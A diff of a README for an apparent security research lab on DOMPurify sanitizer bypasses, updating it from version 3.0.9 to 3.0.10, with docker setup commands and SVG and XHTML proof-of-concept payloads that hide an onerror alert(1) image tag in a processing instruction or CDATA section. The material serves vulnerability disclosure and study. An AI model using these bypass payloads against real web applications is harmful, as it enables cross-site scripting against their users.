@@ -1,14 +1,14 @@
-# Dompurify 3.0.9 bypass - Node type confusion
+# Dompurify 3.0.10 bypass - Node type confusion
 
 __Read this in other languages:__ [English](README.md), [Français](README.fr.md)
 
-Link to the full article (in french) : https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.9-bypass-node-type-confusion
+Link to the full article (in french) : https://sharpforce.gitbook.io/cybersecurity/mes-articles/2024/mai/dompurify-3.0.10-bypass-confusion-nodename-and-cdata
 
 ## Installation
 
 ```
-docker build -t dompurify-3.0.9-bypass .
-docker run -p 3000:3000 dompurify-3.0.9-bypass
+docker build -t dompurify-3.0.10-bypass .
+docker run -p 3000:3000 dompurify-3.0.10-bypass
 ```
 
 ![image](https://github.com/Sharpforce/cybersecurity-code/assets/6013418/75be9d65-91ce-4fc4-b561-9c6be3699627)
@@ -30,7 +30,7 @@ The following SVG file allows bypass exploitation:
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
   <rect width="50" height="50" fill="green" />
-  <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
+  <?img > <img src=x onerror="alert(1)"> ?>
 </svg>
 ```
 
@@ -46,8 +46,8 @@ The following XHTML file allows bypass exploitation:
 </head>
 <body>
     <h1>Document XHTML</h1>
-    <p>Exploitation of Dompurify 3.0.9.</p>
-    <?xml-stylesheet > <img src=x onerror="alert(1)"> ?>
+    <p>Exploitation of Dompurify 3.0.10.</p>
+    <![CDATA[ ><img src onerror=alert(1) ]]>
 </body>
 </html>
 ```
